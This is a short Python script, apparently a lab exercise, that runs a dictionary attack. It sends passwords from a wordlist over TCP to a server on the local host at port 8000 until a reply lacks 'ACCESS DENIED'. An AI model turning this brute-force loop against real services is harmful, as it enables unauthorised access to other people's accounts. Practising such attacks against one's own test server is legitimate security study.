import socket
import sys

PORT = 8000 #configure port
HOST = socket.gethostname() #configure host
SHOW_LOGS = False # show logs to debug if what else  the password that the program tries

def connect_to_server(first_time = False):
    s = socket.socket()
    try:
        s.connect((HOST, PORT))
        data = s.recv(1024)
    except:
        pass
    if first_time:
        print(f'connected to server...\n{data.decode()[0:47] if not SHOW_LOGS else data.decode()}')
    return s

def dictionary_attack():
    print("Dictionary Attack is Starting...")
    f = open("password_list.txt")
    s = connect_to_server(True)
    counter = 0
    for x in f:
        if SHOW_LOGS:
            print(f'trying for password: {x}')
        counter += 1
        if (counter % 5 == 0):
            s.close()
            s = connect_to_server()
        try:
            s.sendall(x.encode("utf-8"))
            reply = s.recv(1024).strip().decode()
        except:
            pass
        if "ACCESS DENIED" not in reply:
            print(f'password is: {x} attempts to get password: {counter}\n"{reply}"')
            break
    else:
        print(f'password not found after {counter} attempts')

if __name__ == "__main__":
    if len(sys.argv) > 1:
        args = sys.argv[1:]
        SHOW_LOGS = "-l" in args
    dictionary_attack()